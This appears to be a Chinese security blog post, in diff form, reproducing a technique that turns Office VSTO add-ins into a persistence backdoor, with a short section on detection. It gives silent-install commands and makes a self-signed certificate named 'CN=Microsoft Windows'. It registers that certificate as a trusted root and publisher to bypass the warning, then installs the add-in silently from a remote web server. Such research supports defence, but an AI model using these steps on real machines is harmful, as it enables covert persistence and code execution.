@@ -1,0 +1,225 @@
+<article class="post">
+  <h1>利用VSTO实现的office后门</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<p>–</p>
+
+<p>最近看了一篇文章《VSTO: The Payload Installer That Probably Defeats Your Application Whitelisting Rules》，介绍了利用VSTO实现Office后门的方法，我在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/">《Use Office to maintain persistence》</a>和<a href="https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/">《Office Persistence on x64 operating system》</a>曾对Office的后门进行过学习，本文将结合自己的研究心得，对该方法进行复现，分析利用思路，分享实际利用方法，最后介绍如何识别这种后门。</p>
+
+<p>文章地址：</p>
+
+<p>https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>VSTO的编写方法</li>
+  <li>实际利用思路</li>
+  <li>后门检测</li>
+</ul>
+
+<h2 id="0x02-vsto的编写方法">0x02 VSTO的编写方法</h2>
+<hr>
+
+<h3 id="1vsto简介">1、VSTO简介</h3>
+
+<p>全称Visual Studio Tools for Office</p>
+
+<p>用来定制Office应用程序，能够同office控件交互</p>
+
+<p>集成在Visual Studio安装包中</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-1.png" alt="Alt text"></p>
+
+<h3 id="2vsto开发">2、VSTO开发</h3>
+
+<p>本节内容是对《VSTO: The Payload Installer That Probably Defeats Your Application Whitelisting Rules》的复现</p>
+
+<h4 id="1-新建工程">(1) 新建工程</h4>
+
+<p><code class="language-plaintext highlighter-rouge">Visual c#</code> -&gt; <code class="language-plaintext highlighter-rouge">Office</code> -&gt; <code class="language-plaintext highlighter-rouge">Word 2010外接程序</code></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-2.png" alt="Alt text"></p>
+
+<h4 id="2-添加代码">(2) 添加代码</h4>
+
+<p>添加引用<code class="language-plaintext highlighter-rouge">System.Windows.Forms</code></p>
+
+<p>添加弹框代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System.Windows.Forms;
+MessageBox.Show("1");
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-3.png" alt="Alt text"></p>
+
+<h4 id="3-编译">(3) 编译</h4>
+
+<p>设置对应.Net版本，编译，生成如下6个文件：</p>
+
+<ul>
+  <li>Microsoft.Office.Tools.Common.v4.0.Utilities.dll</li>
+  <li>Microsoft.Office.Tools.Common.v4.0.Utilities.xml</li>
+  <li>WordAddIn2.dll</li>
+  <li>WordAddIn2.dll.manifest</li>
+  <li>WordAddIn2.pdb</li>
+  <li>WordAddIn2.vsto</li>
+</ul>
+
+<h4 id="4-安装插件">(4) 安装插件</h4>
+
+<p>执行WordAddIn2.vsto</p>
+
+<p>弹框提示无法验证发行者，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-4.png" alt="Alt text"></p>
+
+<p>选择安装</p>
+
+<p>查看<code class="language-plaintext highlighter-rouge">控制面板</code> -&gt; <code class="language-plaintext highlighter-rouge">程序</code> -&gt; <code class="language-plaintext highlighter-rouge">程序和功能</code>，能够找到新安装的插件</p>
+
+<p>####　(5) 打开word.exe，自动加载插件</p>
+
+<p>弹框，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-5.png" alt="Alt text"></p>
+
+<p>查看Word加载项，能够看到加载插件WordAddIn2，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-6.png" alt="Alt text"></p>
+
+<p>至此，成功实现Office后门的安装</p>
+
+<h2 id="0x03-实际利用思路">0x03 实际利用思路</h2>
+<hr>
+
+<p>对于实际利用，首先需要满足安装过程无界面，所以要绕过弹框提示无法验证发行者，需要做如下改进：</p>
+
+<h4 id="1-命令行安装vsto插件">(1) 命令行安装VSTO插件</h4>
+
+<p>使用VSTOInstaller.exe</p>
+
+<p>系统安装Office后包含，默认路径<code class="language-plaintext highlighter-rouge">%ProgramFiles%\Common Files\microsoft shared\VSTO\10.0</code></p>
+
+<p>参数说明：</p>
+
+<p>/i: 安装</p>
+
+<p>/u: 卸载</p>
+
+<p>/s: 静默操作，如果需要信任提示，将不会安装或更新自定义项</p>
+
+<p>安装参数如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"C:\Program Files\Common Files\microsoft shared\VSTO\10.0\VSTOInstaller.exe" /i /s c:\test\WordAddIn2
+</code></pre></div></div>
+
+<p>由于信任提示，无法验证发行者，所以安装失败</p>
+
+<h4 id="2-绕过验证发行者">(2) 绕过验证发行者</h4>
+
+<p>VSTO插件提供签名功能，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/3-1.png" alt="Alt text"></p>
+
+<p>手动生成一组签名证书，使用如下工具</p>
+
+<ul>
+  <li>makecert.exe</li>
+  <li>cert2spc.exe</li>
+  <li>pvk2pfx.exe</li>
+  <li>certmgr.exe</li>
+</ul>
+
+<p>来自于Windows SDK，可供参考下载的地址：</p>
+
+<p>https://github.com/3gstudent/signtools</p>
+
+<p>生成命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecert -n "CN=Microsoft Windows" -r -sv Root.pvk Root.cer
+cert2spc Root.cer Root.spc
+pvk2pfx -pvk Root.pvk -pi 12345678password -spc Root.spc -pfx Root.pfx -f
+</code></pre></div></div>
+
+<p>执行后生成Root.cer、Root.pfx、Root.pvk、Root.spc四个文件</p>
+
+<p>替换插件WordAddIn2的证书，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/3-2.png" alt="Alt text"></p>
+
+<p>证书注册（管理员权限）：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certmgr.exe -add Root.cer -c -s -r localMachine TrustedPublisher
+certmgr.exe -add -c Root.cer -s -r localmachine root
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>需要将证书同时添加到<code class="language-plaintext highlighter-rouge">TrustedPublisher</code>和<code class="language-plaintext highlighter-rouge">root</code></p>
+
+<p>再次安装VSTO插件，不会被拦截</p>
+
+<h4 id="3-远程安装">(3) 远程安装</h4>
+
+<p>VSTOInstaller.exe支持远程安装</p>
+
+<p>可以将VSTO插件放在远程Web服务器上</p>
+
+<p>安装参数如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"C:\Program Files\Common Files\microsoft shared\VSTO\10.0\VSTOInstaller.exe" /s /i http://192.168.62.131/1/WordAddIn1.vsto
+</code></pre></div></div>
+
+<p>综上，实际利用过程如下：</p>
+
+<ul>
+  <li>生成VSTO插件</li>
+  <li>为插件添加签名</li>
+  <li>证书注册</li>
+  <li>远程下载安装</li>
+</ul>
+
+<h2 id="0x04-后门检测">0x04 后门检测</h2>
+<hr>
+
+<p>1、查看<code class="language-plaintext highlighter-rouge">控制面板</code> -&gt; <code class="language-plaintext highlighter-rouge">程序</code> -&gt; <code class="language-plaintext highlighter-rouge">程序和功能</code>，是否有可疑插件</p>
+
+<p><strong>注：</strong></p>
+
+<p>VSTO插件并不会在注册表卸载配置的位置(<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\</code>)创建新键值</p>
+
+<p>2、查看Office的COM加载项</p>
+
+<p><strong>注：</strong></p>
+
+<p>禁用宏并不会阻止VSTO插件的加载</p>
+
+<h2 id="0x05-小结">0x05 小结</h2>
+<hr>
+
+<p>本文测试了利用VSTO实现Office后门的方法，结合实际利用思路，分析检测方法</p>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+
+  </div>
+
+  <div class="date">
+    Written on February  3, 2018
+  </div>
+
+  
+</article>
